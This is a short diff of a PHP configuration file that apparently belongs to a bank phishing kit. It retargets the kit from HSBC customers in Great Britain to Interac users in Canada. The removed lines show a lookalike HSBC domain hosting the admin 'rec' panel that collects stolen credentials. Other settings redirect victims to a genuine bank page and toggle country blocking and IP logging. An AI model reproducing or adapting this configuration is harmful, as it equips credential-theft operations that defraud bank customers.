@@ -1,14 +1,14 @@
 <?php
 
 
-$panel_rec="https://hsbc.securityaccountalert.com/hsbc/admin/func/rec.php"; // Entere here the FULL URL to your admin's rec file
+$panel_rec="/admin/func/rec.php"; // Entere here the FULL URL to your admin's rec file
 
 $pageonline=1; //   feature On (1) and off (0) toggle
 
-$out_url="https://www.hsbc.co.uk/logged-off-b/"; // Enter here the exit url
+$out_url="https://interac.com/error"; // Enter here the exit url
 
 $country_block=0; //Enabling this will only allow allowed_countries visitors
-$allowed_countries=array("GB"); // Enter here the countries standard 2-character codes to allow them.
+$allowed_countries=array("CA"); // Enter here the countries standard 2-character codes to allow them.
 $ip_logger=0;//   feature On (1) and off (0) toggle
 
 
